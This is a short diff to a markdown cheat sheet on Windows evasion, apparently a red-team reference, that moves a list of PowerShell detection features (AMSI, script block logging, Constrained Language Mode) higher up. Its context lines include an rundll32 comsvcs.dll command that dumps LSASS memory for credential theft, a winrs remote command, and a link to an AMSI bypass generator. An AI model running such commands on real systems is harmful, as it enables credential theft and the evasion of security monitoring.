@@ -1,4 +1,11 @@
 # Evasion
+#### Powershell detections
+- System-wide transcription
+- Script Block logging 
+- AntiMalware Scan Interface (AMSI)
+- Constrained Language Mode (CLM) - Integrated with Applocker and WDAC (Device Guard)
+
+
 ## Execution-policy
 #### Get Execution policy
 ```
@@ -106,12 +113,6 @@ winrs -r:<PC NAME> cmd
 rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump 708 C:\Users\Public\lsass.dmp full
 dir C:\Users\Public\lsass.dmp
 ```
-
-#### Powershell detections
-- System-wide transcription
-- Script Block logging 
-- AntiMalware Scan Interface (AMSI)
-- Constrained Language Mode (CLM) - Integrated with Applocker and WDAC (Device Guard)
 
 ## AMSI Bypass
 - https://amsi.fail/
